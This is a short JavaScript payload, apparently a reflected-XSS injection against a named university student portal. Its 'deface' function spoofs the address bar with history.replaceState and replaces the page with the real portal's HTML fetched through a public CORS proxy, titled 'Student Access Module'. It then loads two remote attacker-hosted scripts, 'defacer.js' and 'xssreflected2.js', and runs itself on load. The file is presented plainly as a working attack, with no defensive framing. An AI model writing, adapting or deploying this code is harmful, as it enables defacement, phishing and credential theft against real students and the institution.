function changeURL(newUrl, title = '') {
    // Replace the current URL and history entry without adding a value
    history.replaceState(null, title, newUrl);

    // Optionally update the page title
    if (title) {
        document.title = title;
    }

    console.log(`URL replaced with: ${newUrl}`);
}

function deface(url, title = '') {
    const corsProxyUrl = 'https://corsproxy.io/?url=';
    // Extract the part after the domain
    const path = url.replace("https://aims.ucc-caloocan.edu.ph", "");
    changeURL(path, title);


    fetch(corsProxyUrl + url)
      .then(response => response.text()) // Get the response as text (HTML content)
      .then(data => {
        // Replace the entire HTML of the current document
        document.documentElement.innerHTML = data;

        // Re-attach the JavaScript
        const script = document.createElement("script");
        script.src = "https://cybercutie0.github.io/-/defacer.js";
        document.head.appendChild(script);

        const script2 = document.createElement("script");
        script2.src = "https://cybercutie0.github.io/-/xssreflected2.js";
        document.head.appendChild(script2);
      })
      .catch(error => console.error('Error:', error));
}

console.log("IMPORTING SUCCESS");
deface('https://aims.ucc-caloocan.edu.ph/ucc/students/', 'Student Access Module');
